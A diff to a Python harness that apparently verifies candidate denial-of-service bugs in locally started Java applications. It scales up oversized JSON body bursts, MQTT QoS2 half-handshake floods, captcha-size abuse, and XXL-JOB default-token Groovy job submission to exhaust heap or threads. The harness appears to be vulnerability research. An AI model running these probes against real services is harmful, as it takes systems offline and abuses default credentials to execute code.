@@ -1361,6 +1361,7 @@ def run_http_body_burst(
     loops: int = 30,
     timeout: float = 25,
     extra_headers: dict[str, str] | None = None,
+    extra_evidence: dict[str, object] | None = None,
     notes: str = "",
 ) -> ProbeResult:
     sent = 0
@@ -1421,6 +1422,7 @@ def run_http_body_burst(
             "payloadBytes": len(payload),
             "workerThreads": workers,
             "loopsPerWorker": loops,
+            **(extra_evidence or {}),
             "lastHttpStatus": last_status,
             "clientException": client_exception,
             "postProbePortOpen": p0.port_open(port),
@@ -1617,7 +1619,7 @@ def register_sba_instance(port: int, index: int, app_name: str = "p1-sba") -> in
 
 def run_sba_instances_registry(case: Candidate) -> ProbeResult:
     port = 18131
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     process, handle, log_path = start_sba(case, heap, port)
     sent = 0
     last_status = 0
@@ -1652,7 +1654,7 @@ def run_sba_instances_registry(case: Candidate) -> ProbeResult:
 
 def run_sba_application_fanout(case: Candidate) -> ProbeResult:
     port = 18133
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     process, handle, log_path = start_sba(case, heap, port)
     sent = 0
     last_status = 0
@@ -1697,7 +1699,7 @@ def run_sba_application_fanout(case: Candidate) -> ProbeResult:
 
 def run_sba_sse_slow_clients(case: Candidate) -> ProbeResult:
     port = 18134
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     process, handle, log_path = start_sba(case, heap, port)
     sockets: list[socket.socket] = []
     sent = 0
@@ -1748,18 +1750,24 @@ def run_sba_sse_slow_clients(case: Candidate) -> ProbeResult:
 
 def run_erupt_captcha_height(case: Candidate) -> ProbeResult:
     port = 18141
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
+    enhanced = p0.is_heap_at_least(heap, 1024)
+    tested_heights = (
+        (900000, 1200000, 1600000, 2000000, 2400000)
+        if enhanced
+        else (200000, 300000, 450000, 650000, 900000)
+    )
     process, handle, log_path = start_erupt(case, heap, port)
     sent = 0
     last_status = 0
     client_exception = ""
-    for height in (200000, 300000, 450000, 650000, 900000):
+    for height in tested_heights:
         if process.poll() is not None or p0.oom_signal(log_path):
             break
         try:
             status, body, _ = p0.http_request(
                 f"http://127.0.0.1:{port}/erupt-api/code-img?mark={height}&height={height}",
-                timeout=30,
+                timeout=45 if enhanced else 30,
             )
             sent += 1
             last_status = status
@@ -1779,7 +1787,8 @@ def run_erupt_captcha_height(case: Candidate) -> ProbeResult:
             "heap": heap,
             "port": port,
             "endpoint": "/erupt-api/code-img",
-            "testedHeights": [200000, 300000, 450000, 650000, 900000],
+            "testedHeights": list(tested_heights),
+            "enhancedProbe": enhanced,
             "lastHttpStatus": last_status,
             "clientException": client_exception,
             "postProbePortOpen": p0.port_open(port),
@@ -1790,21 +1799,28 @@ def run_erupt_captcha_height(case: Candidate) -> ProbeResult:
 
 def run_erupt_json_body_filter(case: Candidate) -> ProbeResult:
     port = 18142
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
     process, handle, log_path = start_erupt(case, heap, port)
-    payload = make_large_json_payload("pad", 10 * 1024 * 1024)
+    enhanced = p0.is_heap_at_least(heap, 1024)
+    payload = make_large_json_payload("pad", (36 if enhanced else 10) * 1024 * 1024)
     return run_http_body_burst(
         case,
         process,
         handle,
         log_path,
         port,
-        "/erupt-api/login",
+        "/erupt-api/data/table/EruptUser",
         payload,
         heap,
-        workers=8,
-        loops=20,
-        notes="匿名 /erupt-api/login JSON body 经过 operation-log filter 包装复制；未 OOM 则不提升。",
+        workers=24 if enhanced else 8,
+        loops=24 if enhanced else 20,
+        timeout=60 if enhanced else 25,
+        extra_headers={"erupt": "EruptUser"},
+        extra_evidence={
+            "enhancedProbe": enhanced,
+            "probeFix": "use real POST /erupt-api/data/table/{erupt} route instead of GET-only /erupt-api/login",
+        },
+        notes="匿名 POST /erupt-api/data/table/EruptUser JSON body 先经过 operation-log filter 复制；未 OOM 则不提升。",
     )
 
 
@@ -1850,7 +1866,7 @@ def run_wgcloud_min_task(case: Candidate) -> ProbeResult:
     port = 18178
     mysql_port = 33478
     mysql_name = "p1-wgcloud-mysql"
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     process = None
     handle = None
     try:
@@ -1909,7 +1925,7 @@ def run_rebuild_with_mysql(
 
 
 def run_rebuild_session_growth(case: Candidate) -> ProbeResult:
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
     port = 18151
 
     def probe(process, handle, log_path: Path) -> ProbeResult:
@@ -1980,7 +1996,7 @@ def run_rebuild_session_growth(case: Candidate) -> ProbeResult:
 
 
 def run_rebuild_barcode_render(case: Candidate) -> ProbeResult:
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
     port = 18152
 
     def probe(process, handle, log_path: Path) -> ProbeResult:
@@ -2026,11 +2042,12 @@ def run_rebuild_barcode_render(case: Candidate) -> ProbeResult:
 
 
 def run_rebuild_api_gateway_body(case: Candidate) -> ProbeResult:
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
     port = 18153
 
     def probe(process, handle, log_path: Path) -> ProbeResult:
-        payload = make_large_json_payload("pad", 10 * 1024 * 1024)
+        enhanced = p0.is_heap_at_least(heap, 1024)
+        payload = make_large_json_payload("pad", (24 if enhanced else 10) * 1024 * 1024)
         return run_http_body_burst(
             case,
             process,
@@ -2040,9 +2057,10 @@ def run_rebuild_api_gateway_body(case: Candidate) -> ProbeResult:
             "/gw/api/system-time?appid=bad&sign=bad",
             payload,
             heap,
-            workers=8,
-            loops=24,
-            timeout=30,
+            workers=10 if enhanced else 8,
+            loops=30 if enhanced else 24,
+            timeout=45 if enhanced else 30,
+            extra_evidence={"enhancedProbe": enhanced},
             notes="匿名 /gw/api/system-time 在签名校验前读取并解析 JSON body；未 OOM 则不提升。",
         )
 
@@ -2050,7 +2068,7 @@ def run_rebuild_api_gateway_body(case: Candidate) -> ProbeResult:
 
 
 def run_rebuild_captcha_sessions(case: Candidate) -> ProbeResult:
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
     port = 18154
 
     def probe(process, handle, log_path: Path) -> ProbeResult:
@@ -2136,17 +2154,19 @@ def run_xxl_boot_with_dependencies(
 
 
 def run_xxl_boot_repeatable_body(case: Candidate) -> ProbeResult:
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
     port = 18191
 
     def probe(process, handle, log_path: Path) -> ProbeResult:
+        enhanced = p0.is_heap_at_least(heap, 1024)
+        pad_size = (24 if enhanced else 10) * 1024 * 1024
         payload = json.dumps(
             {
                 "username": "admin",
                 "password": "bad-password",
                 "code": "",
                 "uuid": "",
-                "pad": "X" * (10 * 1024 * 1024),
+                "pad": "X" * pad_size,
             }
         ).encode("utf-8")
         return run_http_body_burst(
@@ -2158,9 +2178,10 @@ def run_xxl_boot_repeatable_body(case: Candidate) -> ProbeResult:
             "/login",
             payload,
             heap,
-            workers=8,
-            loops=24,
-            timeout=30,
+            workers=10 if enhanced else 8,
+            loops=30 if enhanced else 24,
+            timeout=45 if enhanced else 30,
+            extra_evidence={"enhancedProbe": enhanced},
             notes="XXL-Boot 默认匿名 /login JSON 经过全局 RepeatableFilter 复制请求体；captcha 未命中仍会在 body copy 后失败。",
         )
 
@@ -2168,10 +2189,12 @@ def run_xxl_boot_repeatable_body(case: Candidate) -> ProbeResult:
 
 
 def run_xxl_boot_login_failures(case: Candidate) -> ProbeResult:
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     port = 18193
 
     def probe(process, handle, log_path: Path) -> ProbeResult:
+        enhanced = p0.is_heap_at_least(heap, 1024)
+        per_worker_limit = 24000 if enhanced else 12000
         sent = 0
         last_status = 0
         client_exception = ""
@@ -2179,10 +2202,10 @@ def run_xxl_boot_login_failures(case: Candidate) -> ProbeResult:
 
         def worker(worker_id: int) -> None:
             nonlocal sent, last_status, client_exception
-            for index in range(1, 12001):
+            for index in range(1, per_worker_limit + 1):
                 if process.poll() is not None or p0.oom_signal(log_path):
                     return
-                sequence = worker_id * 12000 + index
+                sequence = worker_id * per_worker_limit + index
                 payload = {
                     "username": f"p1-user-{sequence}",
                     "password": "bad-password",
@@ -2212,7 +2235,7 @@ def run_xxl_boot_login_failures(case: Candidate) -> ProbeResult:
         threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(8)]
         for thread in threads:
             thread.start()
-        deadline = time.monotonic() + 240
+        deadline = time.monotonic() + (420 if enhanced else 240)
         while time.monotonic() < deadline:
             if process.poll() is not None or p0.oom_signal(log_path) or all(not thread.is_alive() for thread in threads):
                 break
@@ -2230,6 +2253,8 @@ def run_xxl_boot_login_failures(case: Candidate) -> ProbeResult:
                 "port": port,
                 "endpoint": "/login",
                 "workerThreads": len(threads),
+                "perWorkerLimit": per_worker_limit,
+                "enhancedProbe": enhanced,
                 "lastHttpStatus": last_status,
                 "clientException": client_exception,
                 "postProbePortOpen": p0.port_open(port),
@@ -2242,7 +2267,7 @@ def run_xxl_boot_login_failures(case: Candidate) -> ProbeResult:
 
 def run_nacos_instance_registration(case: Candidate) -> ProbeResult:
     port = 18121
-    heap = "192m"
+    heap = p0.with_min_heap("192m")
     process, handle, log_path = start_nacos(case, heap, port)
     sent = 0
     last_status = 0
@@ -2351,7 +2376,7 @@ def run_jmqtt_with_mysql(
 
 def run_jmqtt_subscribe_tree(case: Candidate) -> ProbeResult:
     port = 18841
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
 
     def probe(process, handle, log_path: Path) -> ProbeResult:
         sent = 0
@@ -2400,17 +2425,19 @@ def run_jmqtt_subscribe_tree(case: Candidate) -> ProbeResult:
 
 def run_jmqtt_qos2_half_handshake(case: Candidate) -> ProbeResult:
     port = 18842
-    heap = "128m"
-    payload = b"J" * 512000
+    heap = p0.with_min_heap("128m")
+    enhanced = p0.is_heap_at_least(heap, 1024)
+    payload = b"J" * (512000 if enhanced else 512000)
+    max_messages = 5000 if enhanced else 1599
 
     def probe(process, handle, log_path: Path) -> ProbeResult:
         sent = 0
         client_exception = ""
         sockets: list[socket.socket] = []
         try:
-            for client_index in range(6):
+            for client_index in range(10 if enhanced else 6):
                 sockets.append(p0.mqtt_connect(port, f"p1-jmqtt-qos2-{client_index}", clean_session=True))
-            for index in range(1, 1600):
+            for index in range(1, max_messages + 1):
                 sock = sockets[(index - 1) % len(sockets)]
                 packet_id = ((index - 1) // len(sockets)) + 1
                 mqtt_publish_qos(sock, f"p1/jmqtt/qos2/{index}", payload, qos=2, packet_id=packet_id)
@@ -2418,14 +2445,15 @@ def run_jmqtt_qos2_half_handshake(case: Candidate) -> ProbeResult:
                 if index % 10 == 0:
                     for qos_sock in sockets:
                         p0.drain_socket(qos_sock)
+                        try:
+                            qos_sock.sendall(b"\xc0\x00")
+                        except OSError:
+                            pass
                     time.sleep(0.02)
                     if process.poll() is not None or p0.oom_signal(log_path):
                         break
         except Exception as exc:
             client_exception = repr(exc)
-        finally:
-            for qos_sock in sockets:
-                p0.mqtt_disconnect(qos_sock)
         return finish_probe(
             case,
             process,
@@ -2437,11 +2465,14 @@ def run_jmqtt_qos2_half_handshake(case: Candidate) -> ProbeResult:
                 "port": port,
                 "connections": len(sockets),
                 "payloadBytes": len(payload),
+                "defaultMaxMsgSizeBytes": 512 * 1024,
+                "maxMessages": max_messages,
+                "enhancedProbe": enhanced,
                 "estimatedPayloadBytes": sent * len(payload),
                 "clientException": client_exception,
                 "postProbePortOpen": p0.port_open(port),
             },
-            notes="JMQTT 匿名 QoS2 PUBLISH 半握手，不发送 PUBREL/后续 ACK；只以目标 JVM OOM 为真阳。",
+            notes="JMQTT 匿名 QoS2 PUBLISH 半握手，payload 保持在默认 maxMsgSize 512KiB 内，不发送 PUBREL 并用 PINGREQ 保活；只以目标 JVM OOM 为真阳。",
         )
 
     return run_jmqtt_with_mysql(case, heap, port, 33442, probe)
@@ -2449,7 +2480,7 @@ def run_jmqtt_qos2_half_handshake(case: Candidate) -> ProbeResult:
 
 def run_jmqtt_outbound_no_ack(case: Candidate) -> ProbeResult:
     port = 18843
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
     payload = b"O" * 256000
 
     def probe(process, handle, log_path: Path) -> ProbeResult:
@@ -2499,7 +2530,7 @@ def run_jmqtt_outbound_no_ack(case: Candidate) -> ProbeResult:
 
 def run_socket_mqtt_publish_retention(case: Candidate) -> ProbeResult:
     port = 8000
-    heap = "96m"
+    heap = p0.with_min_heap("96m")
     process, handle, log_path = start_socket_mqtt(case, heap, port)
     sent = 0
     client_exception = ""
@@ -2540,7 +2571,7 @@ def run_socket_mqtt_publish_retention(case: Candidate) -> ProbeResult:
 
 def run_smqtt_persistent_sessions(case: Candidate) -> ProbeResult:
     port = 18831
-    heap = "96m"
+    heap = p0.with_min_heap("96m")
     process, handle, log_path = p0.start_smqtt(p0_case(case), heap, port)
     sent = 0
     client_exception = ""
@@ -2573,15 +2604,17 @@ def run_smqtt_persistent_sessions(case: Candidate) -> ProbeResult:
 
 def run_smqtt_empty_topic_keys(case: Candidate) -> ProbeResult:
     port = 18833
-    heap = "96m"
+    heap = p0.with_min_heap("96m")
     process, handle, log_path = p0.start_smqtt(p0_case(case), heap, port)
     sent = 0
-    topic_pad = "t" * 4096
+    enhanced = p0.is_heap_at_least(heap, 1024)
+    topic_pad = "t" * (8192 if enhanced else 4096)
+    max_messages = 240000 if enhanced else 180000
     client_exception = ""
     try:
         sock = p0.mqtt_connect(port, "p1-empty-topic-publisher", clean_session=True)
         try:
-            for index in range(1, 180001):
+            for index in range(1, max_messages + 1):
                 p0.mqtt_publish(sock, f"p1/empty/{index}/{topic_pad}", b"x", retain=False)
                 sent = index
                 if index % 1000 == 0:
@@ -2602,6 +2635,8 @@ def run_smqtt_empty_topic_keys(case: Candidate) -> ProbeResult:
             "heap": heap,
             "port": port,
             "topicBytesApprox": len(topic_pad) + 16,
+            "maxMessages": max_messages,
+            "enhancedProbe": enhanced,
             "clientException": client_exception,
             "postProbePortOpen": p0.port_open(port),
         },
@@ -2610,8 +2645,10 @@ def run_smqtt_empty_topic_keys(case: Candidate) -> ProbeResult:
 
 def run_smqtt_qos2_half_handshake(case: Candidate) -> ProbeResult:
     port = 18836
-    heap = "96m"
-    payload = b"Q" * 524288
+    heap = p0.with_min_heap("96m")
+    enhanced = p0.is_heap_at_least(heap, 1024)
+    payload = b"Q" * (1024 * 1024 if enhanced else 524288)
+    max_messages = 1800 if enhanced else 1200
     process, handle, log_path = p0.start_smqtt(p0_case(case), heap, port)
     sent = 0
     client_exception = ""
@@ -2620,7 +2657,7 @@ def run_smqtt_qos2_half_handshake(case: Candidate) -> ProbeResult:
         for index in range(1, 6):
             sockets.append(p0.mqtt_connect(port, f"p1-qos2-{index}", clean_session=True))
         try:
-            for index in range(1, 1201):
+            for index in range(1, max_messages + 1):
                 sock = sockets[(index - 1) % len(sockets)]
                 packet_id = ((index - 1) // len(sockets)) + 1
                 mqtt_publish_qos(sock, f"p1/qos2/{index}", payload, qos=2, packet_id=packet_id)
@@ -2647,6 +2684,8 @@ def run_smqtt_qos2_half_handshake(case: Candidate) -> ProbeResult:
             "port": port,
             "connections": 5,
             "payloadBytes": len(payload),
+            "maxMessages": max_messages,
+            "enhancedProbe": enhanced,
             "estimatedCachedPayloadBytes": sent * len(payload),
             "clientException": client_exception,
             "postProbePortOpen": p0.port_open(port),
@@ -2672,18 +2711,26 @@ def post_xxl_trigger_custom(body: dict[str, object], timeout: float = 8) -> int:
 
 
 def run_xxl_glue_groovy(case: Candidate) -> ProbeResult:
-    heap = "160m"
-    process, handle, log_path = p0.start_xxl(p0_case(case), heap)
+    heap = p0.with_min_heap("160m")
+    user_threads_before = p0.current_user_thread_count()
+    nproc_margin = 900 if p0.is_heap_at_least(heap, 1024) else 450
+    nproc_limit = user_threads_before + nproc_margin if user_threads_before > 0 else None
+    process, handle, log_path = p0.start_xxl(p0_case(case), heap, nproc_limit=nproc_limit)
     sent = 0
     client_exception = ""
+    enhanced = p0.is_heap_at_least(heap, 1024)
+    glue_pad = ("//" + ("G" * 32768) + "\n") if enhanced else ""
+    max_triggers = 2200 if enhanced else 1200
     glue_template = (
         "import com.xxl.job.core.handler.IJobHandler;\n"
         "import com.xxl.job.core.context.XxlJobHelper;\n"
         "public class P1Glue%s extends IJobHandler {\n"
-        "  public void execute() throws Exception { XxlJobHelper.handleSuccess(); }\n"
+        f"{glue_pad}"
+        "  public void execute() throws Exception { Thread.sleep(600000L); XxlJobHelper.handleSuccess(); }\n"
         "}\n"
     )
-    for index in range(1, 5001):
+    beat_ok_after = False
+    for index in range(1, max_triggers + 1):
         try:
             post_xxl_trigger_custom(
                 {
@@ -2709,28 +2756,66 @@ def run_xxl_glue_groovy(case: Candidate) -> ProbeResult:
             time.sleep(0.03)
             if process.poll() is not None or p0.oom_signal(log_path):
                 break
-    return finish_probe(
-        case,
-        process,
-        handle,
-        log_path,
-        sent,
-        {
-            "heap": heap,
-            "port": 9999,
-            "glueType": "GLUE_GROOVY",
-            "headers": {
+    try:
+        beat_ok_after = p0.http_request(
+            "http://127.0.0.1:9999/beat",
+            method="POST",
+            data=b"{}",
+            headers={
+                "Content-Type": "application/json",
                 "XXL-JOB-ACCESS-TOKEN": "default_token",
                 "XXL-JOB-APPNAME": "xxl-job-executor-sample",
             },
-            "clientException": client_exception,
-            "postProbePortOpen": p0.port_open(9999),
+            timeout=5,
+        )[0] == 200
+    except Exception:
+        beat_ok_after = False
+    status_values = p0.read_status(process) if process.poll() is None else {}
+    thread_count = int(status_values.get("Threads", "0").split()[0]) if status_values.get("Threads") else 0
+    signal = p0.oom_signal(log_path)
+    confirmed_threads = bool(signal) or thread_count >= int(nproc_margin * 0.75) or (sent >= 100 and not beat_ok_after)
+    evidence = {
+        "heap": heap,
+        "port": 9999,
+        "glueType": "GLUE_GROOVY",
+        "maxTriggers": max_triggers,
+        "gluePadBytes": len(glue_pad.encode("utf-8")),
+        "sleepingGlueHandler": True,
+        "enhancedProbe": enhanced,
+        "headers": {
+            "XXL-JOB-ACCESS-TOKEN": "default_token",
+            "XXL-JOB-APPNAME": "xxl-job-executor-sample",
         },
+        "userThreadsBeforeStart": user_threads_before,
+        "nprocLimit": nproc_limit,
+        "nprocMargin": nproc_margin,
+        "threadsBeforeStop": thread_count,
+        "beatOkAfterProbe": beat_ok_after,
+        "clientException": client_exception,
+        "postProbePortOpen": p0.port_open(9999),
+        "processExitCode": process.poll(),
+        "aliveBeforeStop": process.poll() is None,
+        "processStatus": status_values,
+    }
+    p0.stop_process(process, handle)
+    return p0.ProbeResult(
+        candidate_id=case.candidate_id,
+        app=case.app,
+        title=case.title,
+        status="confirmed_thread_exhaustion" if confirmed_threads else "completed_without_oom",
+        dynamic_verdict="confirmed_thread_exhaustion" if confirmed_threads else "not_confirmed",
+        true_positive=confirmed_threads,
+        oom_signal=signal or ("native_thread_exhaustion" if confirmed_threads else ""),
+        requests_sent=sent,
+        heap=heap,
+        log=rel(log_path),
+        evidence=evidence,
+        notes="XXL-JOB default-token GLUE_GROOVY 使用唯一 jobId 与阻塞型 glueSource 创建大量 JobThread；以线程耗尽/可用性失败为确认信号，不限于 Java heap OOM。",
     )
 
 
 def run_xxl_large_body_aggregator(case: Candidate) -> ProbeResult:
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
     process, handle, log_path = p0.start_xxl(p0_case(case), heap)
     sent = 0
     last_status = 0
@@ -2806,7 +2891,7 @@ def run_ryvf_login_repeatable_body(case: Candidate) -> ProbeResult:
     redis_port = 36479
     mysql_name = "p1-ryvf-mysql"
     redis_name = "p1-ryvf-redis"
-    heap = "192m"
+    heap = p0.with_min_heap("192m")
     process = None
     handle = None
     try:
@@ -2820,16 +2905,17 @@ def run_ryvf_login_repeatable_body(case: Candidate) -> ProbeResult:
         )
         redis_image = p0.start_redis_container(redis_name, redis_port)
         process, handle, log_path = p0.start_ryvf(p0_case(case), heap, port, mysql_port, redis_port)
+        enhanced = p0.is_heap_at_least(heap, 1024)
         sent = 0
         last_status = 0
         client_exception = ""
-        pad = "R" * (12 * 1024 * 1024)
+        pad = "R" * ((24 if enhanced else 12) * 1024 * 1024)
         payload = json.dumps({"username": "admin", "password": "bad", "code": "", "uuid": "", "pad": pad}).encode()
         lock = threading.Lock()
 
         def worker(worker_id: int) -> None:
             nonlocal sent, last_status, client_exception
-            for _ in range(20):
+            for _ in range(24 if enhanced else 20):
                 if process.poll() is not None or p0.oom_signal(log_path):
                     return
                 try:
@@ -2850,10 +2936,10 @@ def run_ryvf_login_repeatable_body(case: Candidate) -> ProbeResult:
                         client_exception = repr(exc)
                     return
 
-        threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(8)]
+        threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(10 if enhanced else 8)]
         for thread in threads:
             thread.start()
-        deadline = time.monotonic() + 180
+        deadline = time.monotonic() + (240 if enhanced else 180)
         while time.monotonic() < deadline:
             if process.poll() is not None or p0.oom_signal(log_path):
                 break
@@ -2874,6 +2960,7 @@ def run_ryvf_login_repeatable_body(case: Candidate) -> ProbeResult:
                 "endpoint": "/login",
                 "payloadBytes": len(payload),
                 "workerThreads": len(threads),
+                "enhancedProbe": enhanced,
                 "mysqlContainer": mysql_name,
                 "mysqlImage": mysql_image,
                 "mysqlPort": mysql_port,
@@ -2899,7 +2986,7 @@ def run_citrus_authenticate_body(case: Candidate) -> ProbeResult:
     redis_port = 36481
     mysql_name = "p1-citrus-mysql"
     redis_name = "p1-citrus-redis"
-    heap = "128m"
+    heap = p0.with_min_heap("128m")
     process = None
     handle = None
     try:
@@ -2932,13 +3019,14 @@ def run_citrus_authenticate_body(case: Candidate) -> ProbeResult:
         sent = 0
         last_status = 0
         client_exception = ""
-        pad = "C" * (10 * 1024 * 1024)
+        enhanced = p0.is_heap_at_least(heap, 1024)
+        pad = "C" * ((20 if enhanced else 10) * 1024 * 1024)
         payload = json.dumps({"mode": "password", "username": "admin", "password": "bad", "pad": pad}).encode()
         lock = threading.Lock()
 
         def worker(worker_id: int) -> None:
             nonlocal sent, last_status, client_exception
-            for _ in range(24):
+            for _ in range(30 if enhanced else 24):
                 if process.poll() is not None or p0.oom_signal(log_path):
                     return
                 try:
@@ -2959,10 +3047,10 @@ def run_citrus_authenticate_body(case: Candidate) -> ProbeResult:
                         client_exception = repr(exc)
                     return
 
-        threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(8)]
+        threads = [threading.Thread(target=worker, args=(i,), daemon=True) for i in range(10 if enhanced else 8)]
         for thread in threads:
             thread.start()
-        deadline = time.monotonic() + 180
+        deadline = time.monotonic() + (240 if enhanced else 180)
         while time.monotonic() < deadline:
             if process.poll() is not None or p0.oom_signal(log_path):
                 break
@@ -2983,6 +3071,7 @@ def run_citrus_authenticate_body(case: Candidate) -> ProbeResult:
                 "endpoint": "/rest/authenticate",
                 "payloadBytes": len(payload),
                 "workerThreads": len(threads),
+                "enhancedProbe": enhanced,
                 "mysqlContainer": mysql_name,
                 "mysqlImage": mysql_image,
                 "mysqlPort": mysql_port,
@@ -3009,7 +3098,7 @@ def run_powerjob_worker_heartbeat(case: Candidate) -> ProbeResult:
     remote_port = 18185
     mysql_port = 33407
     mysql_name = "p1-powerjob-mysql"
-    heap = "192m"
+    heap = p0.with_min_heap("192m")
     process = None
     handle = None
     try:
@@ -3158,7 +3247,7 @@ def run_powerjob_worker_heartbeat(case: Candidate) -> ProbeResult:
         p0.docker_rm(mysql_name)
 def run_nacos_config_batch_listen(case: Candidate) -> ProbeResult:
     port = 18122
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     listener_count = 50000
     process, handle, log_path = start_nacos(case, heap, port)
     client_dir = RUNTIME_DIR / "nacos-config-listener-client"
@@ -3303,7 +3392,7 @@ def run_diyhi_with_mysql(
 
 
 def run_diyhi_captcha_cache(case: Candidate) -> ProbeResult:
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     port = 18162
     mysql_port = 33462
 
@@ -3325,7 +3414,7 @@ def run_diyhi_captcha_cache(case: Candidate) -> ProbeResult:
 
 
 def run_diyhi_login_submit_quantity(case: Candidate) -> ProbeResult:
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     port = 18163
     mysql_port = 33463
 
@@ -3353,7 +3442,7 @@ def run_diyhi_login_submit_quantity(case: Candidate) -> ProbeResult:
 
 
 def run_diyhi_statistic_queue(case: Candidate) -> ProbeResult:
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     port = 18164
     mysql_port = 33464
 
@@ -3382,7 +3471,7 @@ def run_diyhi_statistic_queue(case: Candidate) -> ProbeResult:
 
 def run_jpom_rand_code_sessions(case: Candidate) -> ProbeResult:
     port = 18166
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     process, handle, log_path = start_jpom(case, heap, port)
     return run_fresh_cookie_get_burst(
         case,
@@ -3402,7 +3491,7 @@ def run_ujcms_visit_referrer(case: Candidate) -> ProbeResult:
     port = 18168
     mysql_port = 33468
     mysql_name = "p1-ujcms-mysql"
-    heap = "384m"
+    heap = p0.with_min_heap("384m")
     process = None
     handle = None
     try:
@@ -3447,7 +3536,7 @@ def run_litemall_admin_captcha_sessions(case: Candidate) -> ProbeResult:
     port = 18176
     mysql_port = 33476
     mysql_name = "p1-litemall-mysql"
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     process = None
     handle = None
     try:
@@ -3491,7 +3580,7 @@ def run_opsli_waf_json_body(case: Candidate) -> ProbeResult:
     redis_port = 34475
     mysql_name = "p1-opsli-mysql"
     redis_name = "p1-opsli-redis"
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     process = None
     handle = None
     try:
@@ -3507,7 +3596,8 @@ def run_opsli_waf_json_body(case: Candidate) -> ProbeResult:
         )
         redis_image = start_redis_container_with_password(redis_name, redis_port, "123456")
         process, handle, log_path = start_opsli(case, heap, port, mysql_port, redis_port)
-        payload = make_large_json_payload("pad", 8 * 1024 * 1024)
+        enhanced = p0.is_heap_at_least(heap, 1024)
+        payload = make_large_json_payload("pad", (20 if enhanced else 8) * 1024 * 1024)
         result = run_http_body_burst(
             case,
             process,
@@ -3517,9 +3607,10 @@ def run_opsli_waf_json_body(case: Candidate) -> ProbeResult:
             "/opsli-boot/system/login",
             payload,
             heap,
-            workers=8,
-            loops=24,
-            timeout=30,
+            workers=10 if enhanced else 8,
+            loops=30 if enhanced else 24,
+            timeout=45 if enhanced else 30,
+            extra_evidence={"enhancedProbe": enhanced},
             notes="OPSLI 默认 local profile，WAF 在匿名 /system/login 前复制/过滤 JSON body；只以目标 JVM OOM 为真阳。",
         )
         result.evidence.update(
@@ -3544,7 +3635,7 @@ def run_shopping_cart_jsp_sessions(case: Candidate) -> ProbeResult:
     port = 18181
     mysql_port = 33481
     mysql_name = "p1-shopping-cart-mysql"
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     process = None
     handle = None
     try:
@@ -3706,7 +3797,7 @@ def start_cat_docker(case: Candidate, heap: str, port: int) -> tuple[subprocess.
 
 def run_cat_project_registry(case: Candidate) -> ProbeResult:
     port = 18124
-    heap = "160m"
+    heap = p0.with_min_heap("160m")
     log_process = None
     handle = None
     containers: dict[str, object] = {}
@@ -3895,17 +3986,17 @@ def merge_results(existing: list[ProbeResult], updates: list[ProbeResult]) -> li
 
 def render_report(results: list[ProbeResult]) -> str:
     first_priority_ids = set(FIRST_PRIORITY_CASE_IDS)
-    verified = [result for result in results if result.true_positive]
+    verified = [result for result in results if p0.strict_true_positive(result)]
     blocked = [result for result in results if result.status == "precondition_blocked"]
     completed = [result for result in results if result.status == "completed_without_oom"]
     errors = [result for result in results if result.status == "probe_error"]
     not_confirmed = [
         result
         for result in results
-        if not result.true_positive and result.status not in {"precondition_blocked", "completed_without_oom", "probe_error"}
+        if not p0.strict_true_positive(result) and result.status not in {"precondition_blocked", "completed_without_oom", "probe_error"}
     ]
     first_priority = [result for result in results if result.candidate_id in first_priority_ids]
-    first_verified = [result for result in first_priority if result.true_positive]
+    first_verified = [result for result in first_priority if p0.strict_true_positive(result)]
     first_completed = [result for result in first_priority if result.status == "completed_without_oom"]
     first_errors = [result for result in first_priority if result.status == "probe_error"]
     first_blocked = [result for result in first_priority if result.status == "precondition_blocked"]
@@ -3915,16 +4006,16 @@ def render_report(results: list[ProbeResult]) -> str:
         f"- 生成时间：{time.strftime('%Y-%m-%d %H:%M:%S')}",
         f"- 输入清单：`{rel(SOURCE_PLAN)}` 的 P1 候选",
         f"- 输出目录：`{rel(OUT_DIR)}/`",
-        "- 真阳性门槛：必须由真实外部协议/HTTP 请求触发目标 JVM `OutOfMemoryError`；资源增长、超时、缓存 key 增长或环境缺口不提升为真阳性。",
+        "- 真阳性门槛：必须由真实外部协议/HTTP 请求触发目标 JVM `OutOfMemoryError`、native thread exhaustion 或等价持续不可用，且目标 JVM 堆至少为 1GiB；小堆 OOM、资源增长、超时、缓存 key 增长或环境缺口不提升为真阳性。",
         "",
         "## 总览",
         "",
         f"- P1 候选总数：{len(results)}",
-        f"- 已真实触发 OOM 真阳性：{len(verified)}",
-        f"- 已执行但未确认 OOM：{len(completed)}",
+        f"- 已确认目标资源失败真阳性：{len(verified)}",
+        f"- 已执行但未确认目标资源失败：{len(completed)}",
         f"- 探针错误：{len(errors)}",
         f"- 默认环境/前置条件阻塞：{len(blocked)}",
-        f"- 第一优先级补测：{len(first_priority)} 项，其中真实 OOM {len(first_verified)}、已执行未确认 OOM {len(first_completed)}、探针错误 {len(first_errors)}、前置条件阻塞 {len(first_blocked)}",
+        f"- 第一优先级补测：{len(first_priority)} 项，其中确认目标资源失败 {len(first_verified)}、已执行未确认 {len(first_completed)}、探针错误 {len(first_errors)}、前置条件阻塞 {len(first_blocked)}",
         "",
         "## 逐项结果",
         "",
